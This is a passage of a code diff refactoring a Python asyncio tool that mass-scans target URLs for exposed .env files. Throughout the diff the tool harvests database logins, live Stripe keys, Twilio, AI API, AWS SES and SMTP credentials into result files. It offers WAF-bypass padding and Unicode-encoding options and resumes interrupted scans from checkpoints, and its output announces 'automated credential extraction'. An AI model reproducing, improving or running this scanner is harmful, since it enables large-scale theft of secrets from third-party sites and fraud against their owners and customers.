-                f.write(format_twilio_output(result['twilio']))
-            found_items.append(f"{Colors.BLUE}TWILIO{Colors.RESET}")
-            async with lock:
-                stats['twilio'] += 1
-        
-        if result['ai_keys']:
-            for ai_key in result['ai_keys']:
-                with open(output_files['ai'], 'a') as f:
-                    f.write(format_ai_key_output(ai_key))
-                found_items.append(f"{Colors.GREEN}{ai_key['type']}{Colors.RESET}")
-            async with lock:
-                stats['ai'] += len(result['ai_keys'])
-        
-        if result['ses']:
-            with open(output_files['ses'], 'a') as f:
-                f.write(format_ses_output(result['ses']))
-            found_items.append(f"{Colors.AMBER}AWS-SES{Colors.RESET}")
-            async with lock:
-                stats['ses'] += 1
-        
-        if result['smtp']:
-            with open(output_files['smtp'], 'a') as f:
-                f.write(format_smtp_output(result['smtp']))
-            found_items.append(f"{Colors.DARK_GREEN}SMTP{Colors.RESET}")
-            async with lock:
-                stats['smtp'] += 1
-        
-        # Print what was found
-        if found_items:
-            print(f"{Colors.WHITE}  └── Found: {', '.join(found_items)}{Colors.RESET}")
-        else:
-            print(f"{Colors.YELLOW}  └── .env found but no target credentials{Colors.RESET}")
-        
-    except Exception as e:
-        print(f"{Colors.RED}[ERR] {url} - {str(e)[:50]}{Colors.RESET}")
-    
-    return result
+    if results['smtp']:
+        with open(output_files['smtp'], 'a') as f:
+            for item in results['smtp']: f.write(format_smtp_output(item))
+        found_items.append(f"{Colors.DARK_GREEN}SMTP{Colors.RESET}")
+        async with lock: stats['smtp'] += len(results['smtp'])
+
+    if found_items:
+        print(f"{Colors.WHITE}  └── Found: {', '.join(dict.fromkeys(found_items))}{Colors.RESET}")
+    else:
+        print(f"{Colors.YELLOW}  └── .env found but no target credentials{Colors.RESET}")
 
 async def scan_targets(targets, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, skip_urls=None):
-    """Scan all targets concurrently with real-time output"""
     connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, ssl=False)
-    
-    # Stats tracking
-    stats = {
-        'vuln': 0,
-        'db': 0,
-        'stripe': 0,
-        'twilio': 0,
-        'ai': 0,
-        'ses': 0,
-        'smtp': 0
-    }
+    stats = {'vuln': 0, 'db': 0, 'stripe': 0, 'twilio': 0, 'ai': 0, 'ses': 0, 'smtp': 0}
     lock = asyncio.Lock()
     
-    # Filter out already processed URLs
     if skip_urls:
         targets = [t for t in targets if normalize_url(t) not in skip_urls]
         print(f"{Colors.CYAN}[*] Skipping {len(skip_urls)} already processed URLs{Colors.RESET}")
     
     async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
         semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-        
         async def process_with_semaphore(url):
             async with semaphore:
                 return await process_target(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, stats, lock)
-        
         tasks = [process_with_semaphore(normalize_url(t)) for t in targets if normalize_url(t)]
-        
-        results = []
-        for coro in asyncio.as_completed(tasks):
-            result = await coro
-            results.append(result)
-        
-        return results, stats
+        await asyncio.gather(*tasks)
+        return stats
 
 def signal_handler(signum, frame):
-    """Handle CTRL+C signal"""
     save_checkpoint()
     sys.exit(0)
 
 async def main():
     global checkpoint_state
-    
-    # Register signal handler for CTRL+C
     signal.signal(signal.SIGINT, signal_handler)
-    
     print_banner()
     
-    # Check for existing checkpoint
     checkpoint = load_checkpoint()
-    skip_urls = None
-    
+    resume = 'n'
     if checkpoint:
         print(f"{Colors.YELLOW}[!] Session checkpoint found!{Colors.RESET}")
         print(f"{Colors.CYAN}    Target file: {checkpoint['target_file']}{Colors.RESET}")
         print(f"{Colors.CYAN}    Output dir: {checkpoint['output_dir']}{Colors.RESET}")
         print(f"{Colors.CYAN}    Processed: {len(checkpoint['processed_urls'])} URLs{Colors.RESET}")
-        
         resume = input(f"{Colors.AMBER}[+] Continue from checkpoint? (Y/n): {Colors.RESET}").strip().lower()
-        
         if resume != 'n':
-            # Restore checkpoint state
             checkpoint_state = checkpoint.copy()
-            target_input = checkpoint['target_file']
-            output_dir = checkpoint['output_dir']
-            waf_bypass = checkpoint['waf_bypass']
-            waf_bypass_size_kb = checkpoint['waf_bypass_size_kb']
-            unicode_encode = checkpoint['unicode_encode']
+            target_input, output_dir = checkpoint['target_file'], checkpoint['output_dir']
+            waf_bypass, waf_bypass_size_kb, unicode_encode = checkpoint['waf_bypass'], checkpoint['waf_bypass_size_kb'], checkpoint['unicode_encode']
             skip_urls = checkpoint['processed_urls']
-            
             print(f"{Colors.GREEN}[*] Resuming from checkpoint...{Colors.RESET}")
         else:
-            # Start fresh
-            checkpoint = None
-            try:
-                os.remove(PID_RESTORE)
-            except:
-                pass
+            try: os.remove(PID_RESTORE)
+            except: pass
     
     if not checkpoint or resume == 'n':
-        # Get target file
         target_input = input(f"{Colors.AMBER}[+] Targets file path: {Colors.RESET}").strip()
-        
         if not os.path.isfile(target_input):
             print(f"{Colors.RED}[!] File not found: {target_input}{Colors.RESET}")
             return
-        
-        # WAF Bypass Options
         waf_bypass = input(f"{Colors.AMBER}[+] Enable WAF bypass? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
         waf_bypass_size_kb = 128
         if waf_bypass:
             size_input = input(f"{Colors.AMBER}[+] Junk data size in KB (default 128): {Colors.RESET}").strip()
-            if size_input.isdigit():
-                waf_bypass_size_kb = int(size_input)
-        
+            if size_input.isdigit(): waf_bypass_size_kb = int(size_input)
         unicode_encode = input(f"{Colors.AMBER}[+] Enable Unicode encoding? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
-        
-        # Create output directory with timestamp
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        output_dir = f"Result_{ts}"
+        output_dir = f"Result_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
         os.makedirs(output_dir, exist_ok=True)
+        skip_urls = None
     
-    # Load targets
     with open(target_input) as f:
         targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
     
-    print(f"{Colors.CYAN}[*] Loaded {len(targets)} targets{Colors.RESET}")
+    checkpoint_state.update({'target_file': target_input, 'output_dir': output_dir, 'waf_bypass': waf_bypass, 'waf_bypass_size_kb': waf_bypass_size_kb, 'unicode_encode': unicode_encode})
     
-    # Update checkpoint state
-    checkpoint_state['target_file'] = target_input
-    checkpoint_state['output_dir'] = output_dir
-    checkpoint_state['waf_bypass'] = waf_bypass
-    checkpoint_state['waf_bypass_size_kb'] = waf_bypass_size_kb
-    checkpoint_state['unicode_encode'] = unicode_encode
-    
-    # Output files
     output_files = {
-        'db': f"{output_dir}/DB-Credentials.txt",
-        'stripe': f"{output_dir}/Stripe-Key.txt",
-        'twilio': f"{output_dir}/Twilio.txt",
-        'ai': f"{output_dir}/AI-Key.txt",
-        'ses': f"{output_dir}/AWS-SES.txt",
-        'smtp': f"{output_dir}/SMTP.txt",
-        'vuln': f"{output_dir}/Vulnerable.txt"
+        'db': f"{output_dir}/DB-Credentials.txt", 'stripe': f"{output_dir}/Stripe-Key.txt",
+        'twilio': f"{output_dir}/Twilio.txt", 'ai': f"{output_dir}/AI-Key.txt",
+        'ses': f"{output_dir}/AWS-SES.txt", 'smtp': f"{output_dir}/SMTP.txt", 'vuln': f"{output_dir}/Vulnerable.txt"
     }
     
-    # Create output files if they don't exist (don't clear on resume)
     if not skip_urls:
-        for key, filepath in output_files.items():
-            open(filepath, 'w').close()
+        for fpath in output_files.values(): open(fpath, 'w').close()
     
+    print(f"{Colors.CYAN}[*] Loaded {len(targets)} targets{Colors.RESET}")
     print(f"\n{Colors.CYAN}[*] Output directory: {output_dir}/{Colors.RESET}")
     print(f"{Colors.CYAN}[*] Starting automated credential extraction...{Colors.RESET}")
     print(f"{Colors.YELLOW}[*] Press CTRL+C to save progress and exit{Colors.RESET}")
     print(f"{Colors.DARK_GREEN}{'='*70}{Colors.RESET}\n")
     
-    try:
-        # Run scan
-        results, stats = await scan_targets(targets, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, skip_urls)
-        
-        # Save vulnerable URLs
-        with open(output_files['vuln'], 'w') as f:
-            for r in results:
-                if r['vulnerable']:
-                    f.write(f"{r['url']}\n")
-        
-        # Remove checkpoint on successful completion
-        try:
-            os.remove(PID_RESTORE)
-        except:
-            pass
-        
-        # Print summary
-        print(f"\n{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
-        print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}")
-        print(f"                         SCAN COMPLETE")
-        print(f"{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
-        print(f"{Colors.WHITE}Total Targets Scanned:  {len(targets)}{Colors.RESET}")
-        print(f"{Colors.BRIGHT_GREEN}Vulnerable Targets:     {stats['vuln']}{Colors.RESET}")
-        print(f"{Colors.CYAN}Database Credentials:   {stats['db']}{Colors.RESET}")
-        print(f"{Colors.MAGENTA}Stripe Keys (sk_live_): {stats['stripe']}{Colors.RESET}")
-        print(f"{Colors.BLUE}Twilio Credentials:     {stats['twilio']}{Colors.RESET}")
-        print(f"{Colors.GREEN}AI API Keys:            {stats['ai']}{Colors.RESET}")
-        print(f"{Colors.AMBER}AWS SES Credentials:    {stats['ses']}{Colors.RESET}")
-        print(f"{Colors.DARK_GREEN}SMTP Credentials:       {stats['smtp']}{Colors.RESET}")
-        print(f"\n{Colors.BRIGHT_GREEN}Output Directory: {output_dir}/{Colors.RESET}")
-        print(f"{Colors.CYAN}Files:{Colors.RESET}")
-        for key, filepath in output_files.items():
-            print(f"  {Colors.WHITE}• {filepath}{Colors.RESET}")
+    stats = await scan_targets(targets, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, skip_urls)
     
-    except KeyboardInterrupt:
-        save_checkpoint()
-        sys.exit(0)
+    # Summary
+    print(f"\n{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}                         SCAN COMPLETE{Colors.RESET}")
+    print(f"{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
+    print(f"{Colors.WHITE}Total Targets Scanned:  {len(targets)}{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}Vulnerable Targets:     {stats['vuln']}{Colors.RESET}")
+    print(f"{Colors.CYAN}Database Credentials:   {stats['db']}{Colors.RESET}")
+    print(f"{Colors.MAGENTA}Stripe Keys (sk_live_): {stats['stripe']}{Colors.RESET}")
+    print(f"{Colors.BLUE}Twilio Credentials:     {stats['twilio']}{Colors.RESET}")
+    print(f"{Colors.GREEN}AI API Keys:            {stats['ai']}{Colors.RESET}")
+    print(f"{Colors.AMBER}AWS SES Credentials:    {stats['ses']}{Colors.RESET}")
+    print(f"{Colors.DARK_GREEN}SMTP Credentials:       {stats['smtp']}{Colors.RESET}")
+    print(f"\n{Colors.BRIGHT_GREEN}Output Directory: {output_dir}/{Colors.RESET}")
 
 if __name__ == '__main__':
     asyncio.run(main())
